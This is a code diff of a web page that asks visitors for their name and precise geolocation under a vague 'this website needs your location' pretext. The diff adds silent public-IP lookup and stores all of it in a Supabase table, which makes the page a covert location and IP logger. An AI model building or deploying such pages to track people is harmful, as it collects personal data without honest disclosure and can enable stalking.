@@ -1,18 +1,24 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link
-  rel="stylesheet"
-  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-/>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+  />
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <title>Location Access</title>
 
   <style>
+
     body {
       font-family: Arial, sans-serif;
       text-align: center;
@@ -53,111 +59,346 @@
       margin-top: 25px;
       word-break: break-word;
     }
+
   </style>
+
 </head>
 
 <body>
 
   <div class="box">
+
     <h2>Location Access</h2>
 
     <p>
       This website needs your location to continue.
     </p>
 
-    <button id="allow">Allow</button>
-    <button id="deny">Not Allow</button>
+    <button id="allow">
+      Allow
+    </button>
 
-   <div id="result"></div>
+    <button id="deny">
+      Not Allow
+    </button>
 
-<div id="map" style="
-  height: 400px;
-  margin-top: 25px;
-  border-radius: 15px;
-  overflow: hidden;
-"></div>
+    <div id="result"></div>
+
+    <div
+      id="map"
+      style="
+        height: 400px;
+        margin-top: 25px;
+        border-radius: 15px;
+        overflow: hidden;
+      "
+    ></div>
+
   </div>
 
+
   <script>
-    const allowButton = document.getElementById("allow");
-    const denyButton = document.getElementById("deny");
-    const result = document.getElementById("result");
 
-    allowButton.addEventListener("click", () => {
-const name = prompt("Enter your name:");
-        
-const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
-const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
-      const supabase = window.supabase.createClient(
-  SUPABASE_URL,
-  SUPABASE_KEY
-);
-      if (!navigator.geolocation) {
-        result.innerHTML = "Geolocation is not supported by your browser.";
-        return;
-      }
+    // --------------------------------
+    // BUTTONS
+    // --------------------------------
 
-      result.innerHTML = "Requesting your location...";
+    const allowButton =
+      document.getElementById("allow");
 
-      navigator.geolocation.getCurrentPosition(
+    const denyButton =
+      document.getElementById("deny");
 
-        async function(position) {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
-const map = L.map("map").setView([latitude, longitude], 16);
+    const result =
+      document.getElementById("result");
 
-L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-  attribution: "&copy; OpenStreetMap contributors"
-}).addTo(map);
 
-L.marker([latitude, longitude])
-  .addTo(map)
-  .bindPopup("Your current location")
-  .openPopup();
-  const { data, error } = await supabase
-    .from("locations")
-    .insert([
-      {
-        name: name,
-    latitude: latitude,
-    longitude: longitude
-      }
-    ]);
+    // --------------------------------
+    // SUPABASE
+    // --------------------------------
 
-  if (error) {
-    result.innerHTML = "Could not save location.";
-    console.error(error);
-    return;
-  }
+    const SUPABASE_URL =
+      "https://mxichdljcrlcomnhkcin.supabase.co";
 
-  result.innerHTML = `
-  <h3>Location received ✅</h3>
-  <p>Your location has been received successfully.</p>
-`;
-        },
+    const SUPABASE_KEY =
+      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
-        function(error) {
-          if (error.code === 1) {
-            result.innerHTML = "Location permission was denied.";
-          } else if (error.code === 2) {
-            result.innerHTML = "Location is unavailable.";
-          } else if (error.code === 3) {
-            result.innerHTML = "Location request timed out.";
-          }
-        },
-
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
+    const supabase =
+      window.supabase.createClient(
+        SUPABASE_URL,
+        SUPABASE_KEY
       );
-    });
 
-    denyButton.addEventListener("click", () => {
-      result.innerHTML = "Location access was not allowed.";
-    });
+
+    // --------------------------------
+    // ALLOW LOCATION
+    // --------------------------------
+
+    allowButton.addEventListener(
+      "click",
+      () => {
+
+        const name =
+          prompt("Enter your name:");
+
+        if (!name) {
+
+          result.innerHTML =
+            "Please enter your name.";
+
+          return;
+        }
+
+
+        // Check Geolocation
+        if (!navigator.geolocation) {
+
+          result.innerHTML =
+            "Geolocation is not supported by your browser.";
+
+          return;
+        }
+
+
+        result.innerHTML =
+          "Requesting your location...";
+
+
+        navigator.geolocation.getCurrentPosition(
+
+          // --------------------------------
+          // LOCATION SUCCESS
+          // --------------------------------
+
+          async function(position) {
+
+            try {
+
+              const latitude =
+                position.coords.latitude;
+
+              const longitude =
+                position.coords.longitude;
+
+
+              result.innerHTML =
+                "Getting your public IP address...";
+
+
+              // --------------------------------
+              // GET PUBLIC IP
+              // --------------------------------
+
+              const ipResponse =
+                await fetch(
+                  "https://api.ipify.org?format=json"
+                );
+
+
+              if (!ipResponse.ok) {
+
+                throw new Error(
+                  "Could not get public IP address."
+                );
+
+              }
+
+
+              const ipData =
+                await ipResponse.json();
+
+
+              const ipAddress =
+                ipData.ip;
+
+
+              // --------------------------------
+              // SHOW MAP
+              // --------------------------------
+
+              const map =
+                L.map("map").setView(
+                  [latitude, longitude],
+                  16
+                );
+
+
+              L.tileLayer(
+                "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
+                {
+                  attribution:
+                    "&copy; OpenStreetMap contributors"
+                }
+              ).addTo(map);
+
+
+              L.marker(
+                [latitude, longitude]
+              )
+                .addTo(map)
+                .bindPopup(
+                  "Your current location"
+                )
+                .openPopup();
+
+
+              // --------------------------------
+              // SAVE TO SUPABASE
+              // --------------------------------
+
+              result.innerHTML =
+                "Saving your location...";
+
+
+              const {
+                data,
+                error
+              } = await supabase
+
+                .from("locations")
+
+                .insert([
+                  {
+                    name: name,
+                    latitude: latitude,
+                    longitude: longitude,
+                    ip_address: ipAddress
+                  }
+                ]);
+
+
+              // --------------------------------
+              // DATABASE ERROR
+              // --------------------------------
+
+              if (error) {
+
+                console.error(
+                  "Supabase error:",
+                  error
+                );
+
+                result.innerHTML =
+                  "❌ Could not save location.<br><br>" +
+                  error.message;
+
+                return;
+              }
+
+
+              // --------------------------------
+              // SUCCESS
+              // --------------------------------
+
+              result.innerHTML = `
+
+                <h3>
+                  Location received ✅
+                </h3>
+
+                <p>
+                  Your location has been received successfully.
+                </p>
+
+              `;
+
+
+              console.log(
+                "Saved successfully:",
+                {
+                  name: name,
+                  latitude: latitude,
+                  longitude: longitude,
+                  ip_address: ipAddress
+                }
+              );
+
+
+            } catch (error) {
+
+              console.error(
+                "Error:",
+                error
+              );
+
+              result.innerHTML =
+                "❌ Something went wrong.<br><br>" +
+                error.message;
+
+            }
+
+          },
+
+
+          // --------------------------------
+          // LOCATION ERROR
+          // --------------------------------
+
+          function(error) {
+
+            if (error.code === 1) {
+
+              result.innerHTML =
+                "Location permission was denied.";
+
+            }
+
+            else if (error.code === 2) {
+
+              result.innerHTML =
+                "Location is unavailable.";
+
+            }
+
+            else if (error.code === 3) {
+
+              result.innerHTML =
+                "Location request timed out.";
+
+            }
+
+            else {
+
+              result.innerHTML =
+                "Could not get your location.";
+
+            }
+
+          },
+
+
+          // --------------------------------
+          // GEOLOCATION OPTIONS
+          // --------------------------------
+
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+
+        );
+
+      }
+    );
+
+
+    // --------------------------------
+    // DENY
+    // --------------------------------
+
+    denyButton.addEventListener(
+      "click",
+      () => {
+
+        result.innerHTML =
+          "Location access was not allowed.";
+
+      }
+    );
+
   </script>
 
 </body>
 </html>
+```
